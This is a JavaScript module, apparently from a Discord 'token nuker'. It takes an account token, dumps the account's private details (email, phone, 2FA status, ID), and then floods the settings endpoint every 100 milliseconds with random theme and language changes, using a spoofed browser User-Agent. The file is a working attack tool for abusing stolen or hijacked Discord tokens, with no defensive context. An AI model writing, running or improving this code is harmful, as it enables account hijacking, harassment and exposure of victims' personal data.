const { Color } = require('./Design');
const Axios = require('axios').default;

class User extends Color {
  constructor({ token }) {
    super();
    this.token = token;
    
    this.headers = {
      info: {
        'Content-Type': 'application/json',
        'Authorization': this.token
      },

      nuke: {
        'Authorization': this.token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
      }
    };
  };

  async info() {
    try {
      const data = (await Axios.get('https://discord.com/api/v8/users/@me', { headers: this.headers.info })).data;
      const base = 'https://cdn.discordapp.com/avatars/';

      return [
        `Tag      |   ${data.username + '#' + data.discriminator}`,
        `Email    |   ${data.email || 'None'}`,
        `2FA      |   ${data.mfa_enabled}`,
        `Phone    |   ${data.phone || 'None'}`,
        `ID       |   ${data.id}`,
        `Language |   ${data.locale}`,
        `Verified |   ${data.verified}`,
        `Flags    |   All: ${data.flags} | Private: ${data.public_flags}`,
        `NSFW     |   ${data.nsfw_allowed}`,
        `Avatar   |   ${base + `${data.id}/${data.avatar}.jpg`}`
      ];
    } catch(e) {
      throw e;
    };
  };

  async nuke() {
    const base = 'https://discord.com/api/v8';

    const status = (await Axios.get(base + '/users/@me', {
      headers: this.headers.info
    })).status;

    if (status !== 200) throw new Error('Request Failed With Error Code ' + status);
    setInterval(async() => {
      await Axios(
        {
          method: 'PATCH',
          url: base + '/users/@me/settings',
          headers: this.headers.nuke,
          data: {
            'theme': this.random(['light', 'dark']),
            'locale': this.random(['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'])
          }
        }
      ).catch(
        (e) => {
          Color.log(e, '>', 0);
        }
      );
    }, 100);
  };
  
  random(array = []) {
    return array[Math.floor(Math.random() * array.length)];
  };
};

module.exports.User = User;
